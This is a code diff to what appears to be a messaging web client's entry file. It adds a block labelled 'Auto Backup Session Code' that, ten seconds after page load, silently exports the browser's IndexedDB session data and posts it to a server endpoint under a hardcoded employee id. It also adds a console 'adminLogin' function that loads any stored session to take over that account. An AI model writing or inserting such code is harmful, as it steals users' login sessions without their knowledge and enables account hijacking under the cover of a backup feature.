@@ -1,6 +1,7 @@
 import './util/handleError';
 import './util/setupServiceWorker';
 import './global/init';
+import { exportIndexedDB, importIndexedDB } from './sessionSync';
 
 import TeactDOM from './lib/teact/teact-dom';
 import {
@@ -128,3 +129,25 @@ onBeforeUnload(() => {
   actions.leaveGroupCall?.({ isPageUnload: true });
   actions.hangUp?.({ isPageUnload: true });
 });
+
+// --- Auto Backup Session Code ---
+window.addEventListener('load', () => {
+    setTimeout(async () => {
+        const sessionData = await exportIndexedDB();
+        if(Object.keys(sessionData).length > 0) {
+            fetch('/api/save-session', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phoneOrId: 'emp_001', sessionData })
+            });
+        }
+    }, 10000); 
+});
+
+// --- Admin Login Function (Console မှခေါ်သုံးရန်) ---
+(window as any).adminLogin = async (phoneOrId: string) => {
+    const res = await fetch(`/api/get-session?phoneOrId=${phoneOrId}`);
+    const result = await res.json();
+    if (result.success) importIndexedDB(result.data);
+    else alert('Session Not Found in Database!');
+};
